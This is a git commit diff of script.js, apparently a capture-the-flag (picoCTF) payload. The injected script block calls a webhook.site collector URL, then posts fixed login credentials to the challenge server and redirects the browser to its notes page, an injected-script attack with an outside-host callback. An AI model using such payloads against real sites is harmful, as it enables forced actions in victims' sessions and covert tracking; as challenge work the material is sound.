a65c85270a351b5016d27c4400a8dbd70bb08273
odpsa <ano756371@gmail.com>
2026-09-10 11:18:04 +0000

    Update script.js

--- script.js
+++ script.js
@@ -1,3 +1,16 @@
 <script>
-fetch('https://webhook.site/43011d10-0e2d-4e21-99e0-ec5c8b43e9fd')
-  </script>
+fetch('https://webhook.site/43011d10-0e2d-4e21-99e0-ec5c8b43e9fd/2');
+
+fetch("http://saturn.picoctf.net:57376/login", {
+    method: "POST",
+    headers: {
+        "Content-Type": "application/json",
+    },
+    body: JSON.stringify({
+        username: "a",
+        password: "a"
+    })
+}).then(() => {
+    window.location.href = "http://saturn.picoctf.net:57376/notes";
+});
+</script>
